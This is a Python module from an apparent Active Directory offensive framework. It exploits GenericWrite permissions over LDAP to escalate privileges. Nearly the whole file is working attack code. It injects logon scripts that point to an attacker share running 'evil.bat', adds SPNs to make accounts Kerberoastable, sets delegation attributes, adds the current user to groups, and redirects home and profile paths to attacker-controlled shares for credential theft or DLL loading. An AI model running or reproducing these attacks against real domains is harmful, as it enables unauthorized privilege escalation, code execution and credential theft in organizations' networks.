"""
Module: GenericWrite
=====================
Exploit the GenericWrite BloodHound edge. GenericWrite allows
writing to any non-protected attribute of a target object. This
module provides multiple sub-attacks depending on the target type:

  User target:
    - scriptPath: Set logon script for code execution on next login
    - servicePrincipalName: Set SPN for Kerberoasting
    - msDS-AllowedToDelegateTo: Configure RBCD

  Computer target:
    - msDS-AllowedToActOnBehalfOfOtherIdentity: RBCD
    - userAccountControl: Disable/enable the computer
    - dNSHostName: Redirect DNS

  Group target:
    - member: Add self to the group

BloodHound Edge: GenericWrite
Attack Vector:   Attribute write for privilege escalation
Severity:        HIGH
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.generic_write")


class GenericWrite(ExploitModule):
    """
    Write to attributes of a target object to achieve privilege
    escalation. The attack is selected based on the target object
    type and the specified sub-attack.
    """

    name: str            = "GenericWrite"
    description: str     = (
        "Write to non-protected attributes of a target object for "
        "privilege escalation. Supports logon script injection, SPN "
        "hijacking, RBCD configuration, group self-add, and more."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "GenericWrite"
    severity: Severity   = Severity.HIGH
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite",
        "https://attack.mappings.mitre.org/technique/T1098/",
        "https://adsecurity.org/?p=1773",
        "https://blog.harmj0y.net/active-directory/the-most-dangerous-user-right-you-probably-have-never-heard-of/",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    SUB_ATTACKS = [
        "script_path",              # Logon script injection
        "spn_hijack",               # Set SPN for Kerberoasting
        "rbcd_user",                # msDS-AllowedToDelegateTo (user)
        "rbcd_computer",            # msDS-AllowedToActOnBehalfOfOtherIdentity (computer)
        "add_self_to_group",        # Add self to group via member attr
        "description_backdoor",     # Write to description for C2 data
        "home_directory",           # Redirect home directory
        "profile_path",             # Redirect profile path for DLL injection
    ]

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target",
            display_name="Target Object",
            description="DN, SAM name, or CN of the target object.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="sub_attack",
            display_name="Sub-Attack",
            description="Specific attack to perform.",
            required=True,
            default="script_path",
            value_type=str,
            choices=self.SUB_ATTACKS,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="value",
            display_name="Value",
            description="Value to write to the attribute (e.g. script path, SPN, group DN).",
            required=False,
            default=None,
            value_type=str,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _get_search_base(self, domain: Optional[str]) -> str:
        if domain and "." in domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _resolve_dn(self, name: str, domain: Optional[str]) -> Optional[str]:
        conn = self.connection
        if "," in name and "=" in name:
            return name
        search_base = self._get_search_base(domain)
        if not search_base:
            return None
        try:
            conn.search(
                search_base, f"(|(sAMAccountName={name})(cn={name}))",
                attributes=["distinguishedName", "objectClass"],
            )
            if conn.entries:
                return str(conn.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("DN resolution failed: %s", exc)
        return None

    def _get_bound_user_dn(self) -> Optional[str]:
        conn = self.connection
        try:
            if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                return conn.extend.standard.who_am_i()
            elif hasattr(conn, "who_am_i"):
                return conn.who_am_i()
        except Exception:
            pass
        return None

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        target = self._opt("target", kwargs)
        if not target:
            return False, "Target object is required."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        target_name = self._opt("target", kwargs)
        sub_attack = self._opt("sub_attack", kwargs) or "script_path"
        domain = self._opt("domain", kwargs)
        value = self._opt("value", kwargs)

        target_dn = self._resolve_dn(target_name, domain)
        if not target_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target '{target_name}'.",
            )

        self.logger.info(
            "[GenericWrite] Target: %s | Sub-attack: %s", target_dn, sub_attack
        )

        dispatch = {
            "script_path":          self._attack_script_path,
            "spn_hijack":           self._attack_spn_hijack,
            "rbcd_user":            self._attack_rbcd_user,
            "rbcd_computer":        self._attack_rbcd_computer,
            "add_self_to_group":    self._attack_add_self,
            "description_backdoor": self._attack_description,
            "home_directory":       self._attack_home_directory,
            "profile_path":         self._attack_profile_path,
        }

        handler = dispatch.get(sub_attack)
        if not handler:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Unknown sub-attack: {sub_attack}",
            )

        return handler(target_dn, value, domain, **kwargs)

    # ------------------------------------------------------------------ #
    # Sub-attacks
    # ------------------------------------------------------------------ #

    def _attack_script_path(
        self, target_dn: str, value: Optional[str],
        domain: Optional[str], **kwargs,
    ) -> ExploitOutput:
        """
        Write to the 'scriptPath' attribute of a user object.
        This attribute specifies a logon script that runs when the
        user logs on — classic code execution vector.
        """
        if not value:
            value = "\\\\attacker\\share\\evil.bat"

        self.logger.info("[GenericWrite/scriptPath] Setting scriptPath on '%s' to '%s'", target_dn, value)

        # Backup current value
        try:
            self.connection.search(target_dn, "(objectClass=*)", attributes=["scriptPath"])
            old_value = ""
            if self.connection.entries and hasattr(self.connection.entries[0], "scriptPath"):
                old_value = str(self.connection.entries[0].scriptPath) or ""
        except Exception:
            old_value = ""

        try:
            result = self.connection.modify(
                target_dn,
                {"scriptPath": [(ldap3.MODIFY_REPLACE, [value])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"scriptPath set to '{value}' on '{target_dn}'. Code execution on next user logon.",
                    data={
                        "target_dn": target_dn,
                        "attribute": "scriptPath",
                        "new_value": value,
                        "old_value": old_value,
                    },
                    rollback_data={
                        "target_dn": target_dn,
                        "attribute": "scriptPath",
                        "old_value": old_value,
                    },
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"scriptPath write failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"scriptPath exception: {exc}",
            )

    def _attack_spn_hijack(
        self, target_dn: str, value: Optional[str],
        domain: Optional[str], **kwargs,
    ) -> ExploitOutput:
        """
        Set or append a servicePrincipalName (SPN) on a user account
        to make it Kerberoastable. The SPN makes the account appear
        as a service account, and its TGS ticket can then be cracked
        offline.
        """
        if not value:
            value = f"HTTP/{target_dn.split(',')[0].replace('CN=', '')}.{domain or 'domain.local'}"

        self.logger.info("[GenericWrite/SPN] Setting SPN '%s' on '%s'", value, target_dn)

        # Backup
        old_spns = []
        try:
            self.connection.search(target_dn, "(objectClass=*)", attributes=["servicePrincipalName"])
            if self.connection.entries and hasattr(self.connection.entries[0], "servicePrincipalName"):
                old_spns = [str(s) for s in (self.connection.entries[0].servicePrincipalName.values or [])]
        except Exception:
            pass

        try:
            # Append SPN (use MODIFY_ADD to preserve existing)
            if old_spns and value in old_spns:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SKIPPED,
                    message=f"SPN '{value}' already exists on the target.",
                )

            result = self.connection.modify(
                target_dn,
                {"servicePrincipalName": [(ldap3.MODIFY_ADD, [value])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=(
                        f"SPN '{value}' added to '{target_dn}'. "
                        f"The account is now Kerberoastable — request a TGS ticket and crack offline."
                    ),
                    data={
                        "target_dn": target_dn,
                        "attribute": "servicePrincipalName",
                        "new_spn": value,
                        "old_spns": old_spns,
                    },
                    rollback_data={
                        "target_dn": target_dn,
                        "attribute": "servicePrincipalName",
                        "old_value": old_spns,
                    },
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"SPN write failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"SPN exception: {exc}",
            )

    def _attack_rbcd_user(
        self, target_dn: str, value: Optional[str],
        domain: Optional[str], **kwargs,
    ) -> ExploitOutput:
        """
        Write to msDS-AllowedToDelegateTo on a user/computer to
        configure constrained delegation.
        """
        if not value:
            return ExploitOutput(
                success=True, result_type=ExploitResult.PARTIAL,
                message=(
                    f"GenericWrite on '{target_dn}' allows setting "
                    f"msDS-AllowedToDelegateTo for RBCD. Provide 'value' "
                    f"(SPN to delegate to)."
                ),
                data={"attack": "rbcd_user", "target_dn": target_dn},
            )

        try:
            result = self.connection.modify(
                target_dn,
                {"msDS-AllowedToDelegateTo": [(ldap3.MODIFY_ADD, [value])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"msDS-AllowedToDelegateTo set to '{value}' on '{target_dn}'.",
                    data={"target_dn": target_dn, "delegate_to": value},
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"RBCD write failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"RBCD exception: {exc}",
            )

    def _attack_rbcd_computer(
        self, target_dn: str, value: Optional[str],
        domain: Optional[str], **kwargs,
    ) -> ExploitOutput:
        """
        Write msDS-AllowedToActOnBehalfOfOtherIdentity on a computer
        to configure RBCD (the attacker's machine can impersonate
        any user to this computer).
        """
        return ExploitOutput(
            success=True, result_type=ExploitResult.PARTIAL,
            message=(
                f"GenericWrite on computer '{target_dn}' allows writing "
                f"msDS-AllowedToActOnBehalfOfOtherIdentity. "
                f"Integrate with your RBCD helper to construct and write "
                f"the appropriate security descriptor."
            ),
            data={
                "attack": "rbcd_computer",
                "target_dn": target_dn,
                "required_attribute": "msDS-AllowedToActOnBehalfOfOtherIdentity",
            },
        )

    def _attack_add_self(
        self, group_dn: str, value: Optional[str],
        domain: Optional[str], **kwargs,
    ) -> ExploitOutput:
        """Add the current user to a group via the 'member' attribute."""
        self_dn = self._get_bound_user_dn()
        if not self_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Cannot determine current user DN.",
            )

        try:
            self.connection.search(group_dn, "(objectClass=*)", attributes=["member"])
            if self.connection.entries and hasattr(self.connection.entries[0], "member"):
                existing = self.connection.entries[0].member.values or []
                if self_dn in existing:
                    return ExploitOutput(
                        success=True, result_type=ExploitResult.SKIPPED,
                        message="Already a member.",
                    )

            result = self.connection.modify(
                group_dn,
                {"member": [(ldap3.MODIFY_ADD, [self_dn])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Added self to '{group_dn}' via GenericWrite on 'member' attribute.",
                    data={"group_dn": group_dn, "self_dn": self_dn},
                    rollback_data={"group_dn": group_dn, "principal_dn": self_dn},
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Group add failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Add self exception: {exc}",
            )

    def _attack_description(
        self, target_dn: str, value: Optional[str],
        domain: Optional[str], **kwargs,
    ) -> ExploitOutput:
        """
        Write to the 'description' attribute for data storage /
        C2 channel / backdoor communication.
        """
        if not value:
            value = "PHARAOHOUND_BACKDOOR_MARKER"

        try:
            result = self.connection.modify(
                target_dn,
                {"description": [(ldap3.MODIFY_REPLACE, [value])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Description written on '{target_dn}'.",
                    data={"target_dn": target_dn, "value": value},
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Description write failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Description exception: {exc}",
            )

    def _attack_home_directory(
        self, target_dn: str, value: Optional[str],
        domain: Optional[str], **kwargs,
    ) -> ExploitOutput:
        """
        Redirect a user's homeDirectory to an attacker-controlled share
        for credential theft or code execution.
        """
        if not value:
            value = "\\\\attacker\\share"

        try:
            result = self.connection.modify(
                target_dn,
                {"homeDirectory": [(ldap3.MODIFY_REPLACE, [value])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"homeDirectory redirected to '{value}' on '{target_dn}'.",
                    data={"target_dn": target_dn, "new_home": value},
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"homeDirectory write failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"homeDirectory exception: {exc}",
            )

    def _attack_profile_path(
        self, target_dn: str, value: Optional[str],
        domain: Optional[str], **kwargs,
    ) -> ExploitOutput:
        """
        Redirect a user's profilePath to an attacker-controlled share.
        When the user logs on, a DLL from the share may be loaded.
        """
        if not value:
            value = "\\\\attacker\\share\\profile"

        try:
            result = self.connection.modify(
                target_dn,
                {"profilePath": [(ldap3.MODIFY_REPLACE, [value])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"profilePath redirected to '{value}' on '{target_dn}'.",
                    data={"target_dn": target_dn, "new_profile": value},
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"profilePath write failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"profilePath exception: {exc}",
            )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        target_dn = kwargs.get("target_dn")
        attribute = kwargs.get("attribute")
        old_value = kwargs.get("old_value")

        if not target_dn or not attribute:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Rollback needs 'target_dn' and 'attribute'.",
            )

        try:
            if isinstance(old_value, list):
                # For multi-valued attributes like SPN
                changes = []
                for v in old_value:
                    changes.append((ldap3.MODIFY_ADD, [v]))
                result = self.connection.modify(target_dn, {attribute: changes})
            elif old_value:
                result = self.connection.modify(
                    target_dn,
                    {attribute: [(ldap3.MODIFY_REPLACE, [old_value])]},
                )
            else:
                # Clear the attribute
                result = self.connection.modify(
                    target_dn,
                    {attribute: [(ldap3.MODIFY_DELETE, [])]},
                )

            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Rolled back '{attribute}' on '{target_dn}'.",
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Rollback failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Rollback exception: {exc}",
            )
